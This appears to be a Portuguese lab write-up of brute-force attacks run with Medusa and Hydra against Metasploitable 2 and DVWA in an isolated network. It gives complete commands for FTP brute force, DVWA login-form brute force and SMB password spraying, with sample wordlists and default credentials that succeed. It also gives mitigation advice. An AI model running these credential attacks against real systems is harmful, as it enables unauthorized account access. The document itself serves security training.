# Simulação de Ataques de Força Bruta (Medusa)

## Objetivo Geral

Este documento detalha a metodologia e os resultados da simulação de ataques de força bruta contra serviços vulneráveis (FTP, HTTP/Form e SMB) em ambientes controlados (Metasploitable 2 e DVWA). O objetivo principal é demonstrar o uso da ferramenta Medusa (Kali Linux) para auditoria de senhas fracas e propor contramedidas de segurança eficazes.

## Ambiente e Metodologia

A simulação será conduzida em um ambiente de laboratório isolado para garantir que não haja impacto em redes de produção.

### Configuração do Ambiente Virtual (VirtualBox)

  * **Rede:** Rede Interna (Host-Only) – `vboxnet0` (Ex: Sub-rede `192.168.56.0/24`).
  * **VM Atacante:** Kali Linux
      * **IP:** `192.168.56.101` (Definido estaticamente).
      * **Ferramentas:** Medusa, Nmap, Hydra, Wordlists (`rockyou.txt`, etc.).
  * **VM Alvo:** Metasploitable 2 (Contém serviços FTP, SMB e DVWA).
      * **IP:** `192.168.56.102` (Obtido via `ifconfig`).

### Wordlists (Listas de Palavras)

Para os testes, serão utilizadas listas de palavras simplificadas para agilizar a prova de conceito (PoC).

  * `usuarios.txt`:
    ```
    root
    admin
    msfadmin
    user
    ```
  * `senhas.txt`:
    ```
    admin
    password
    123456
    msfadmin
    toor
    ```

## Execução dos Cenários de Teste

### Cenário 1: Ataque de Força Bruta ao Serviço FTP (Metasploitable 2)

  * **Identificação:** O serviço FTP (vsftpd 2.3.4) está em execução na porta 21 do alvo.

  * **Objetivo:** Obter acesso via força bruta, testando múltiplas combinações de usuário e senha.

  * **Comando (Medusa):**

    ```bash
    medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -t 4
    ```

      * `-h`: Host (alvo).
      * `-U`: Arquivo de lista de usuários.
      * `-P`: Arquivo de lista de senhas.
      * `-M`: Módulo do serviço (ftp).
      * `-t`: Número de threads (paralelismo).

  * **Validação de Acesso (Resultado Esperado):**

    ```
    ACCOUNT: msfadmin
    PASSWORD: msfadmin
    [SUCCESS]
    ```

### Cenário 2: Automação de Ataque em Formulário Web (DVWA)

  * **Identificação:** O DVWA está hospedado no Metasploitable 2 ([http://192.168.56.102/dvwa/](https://www.google.com/search?q=http://192.168.56.102/dvwa/)). O formulário de "Brute Force" (Low security) envia um POST com os parâmetros `username` e `password`.

  * **Nota Técnica:** Embora o Medusa possua módulos HTTP, a ferramenta `Hydra` é frequentemente mais flexível para formulários web customizados. Conforme a flexibilidade do desafio, opta-se pelo Hydra para este cenário específico, por sua sintaxe mais direta para `http-post-form`.

  * **Comando (Hydra):**

    ```bash
    hydra -L usuarios.txt -P senhas.txt 192.168.56.102 http-post-form \
    "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
    -V -f -C /path/to/cookies.txt
    ```

      * `-L / -P`: Listas de usuários e senhas.
      * `http-post-form`: Módulo do Hydra.
      * `"[URI]:[Parâmetros POST]:[Mensagem de Falha]"`: A sintaxe chave.
      * `-C`: Necessário para manter a sessão do DVWA (o cookie `PHPSESSID` deve ser capturado previamente).

  * **Validação de Acesso (Resultado Esperado):**

    ```
    [SUCCESS] Host: 192.168.56.102 Login: admin Password: password
    ```

### Cenário 3: Password Spraying em SMB (Metasploitable 2)

  * **Identificação:** O serviço SMB (Samba) está ativo (portas 139/445).

  * **Objetivo:** Simular um ataque de *password spraying*, onde se utiliza uma única senha (comum, ex: `Verao@2025`) contra uma lista extensa de usuários.

  * **Enumeração de Usuários (Pré-requisito):**

    ```bash
    enum4linux 192.168.56.102 > usuarios_smb.txt
    ```

    (Extrair a lista de usuários do output para um novo arquivo `lista_smb_users.txt`).

  * **Comando (Medusa):**

    ```bash
    medusa -h 192.168.56.102 -U lista_smb_users.txt -p 'msfadmin' -M smbnt
    ```

      * `-U`: Lista de usuários enumerados.
      * `-p`: Senha única (minúscula) para o *spraying*.
      * `-M smbnt`: Módulo para SMB (autenticação NTLM).

  * **Validação de Acesso (Resultado Esperado):**

    ```
    ACCOUNT: msfadmin
    PASSWORD: msfadmin
    [SUCCESS]
    ```

## Recomendações de Mitigação (Contramedidas)

A documentação dos resultados deve ser acompanhada por recomendações de *hardening* acionáveis:

  * **Mitigação (Geral):**

      * Implementar **Políticas de Senha Forte** (complexidade, comprimento, rotação).
      * Implementar **Políticas de Bloqueio de Conta** (ex: bloquear após 5 tentativas falhas por 15 minutos).

  * **Mitigação (FTP):**

      * Priorizar o uso de protocolos seguros (ex: **SFTP** ou **FTPS**).
      * Desabilitar contas de usuário genéricas ou padrão.

  * **Mitigação (Web/DVWA):**

      * Implementação de **CAPTCHA** ou reCAPTCHA em formulários de login.
      * Implementação de **Rate Limiting** no lado do servidor ou via WAF (Web Application Firewall).

  * **Mitigação (SMB):**

      * Desabilitar versões obsoletas (SMBv1).
      * Restringir o acesso SMB a hosts autorizados (segmentação de rede).
      * Implementar monitoramento centralizado de logs (SIEM) para detectar falhas de login em massa.

## Considerações

A ferramenta Medusa demonstrou ser eficaz e de rápida execução para serviços de autenticação direta (FTP, SMB). A complexidade aumenta em protocolos aplicacionais (HTTP), onde ferramentas alternativas como Hydra podem oferecer maior granularidade. O desafio reforça que a defesa em profundidade – combinando políticas de senha, bloqueio de contas e monitoramento – é essencial para mitigar ataques de força bruta.
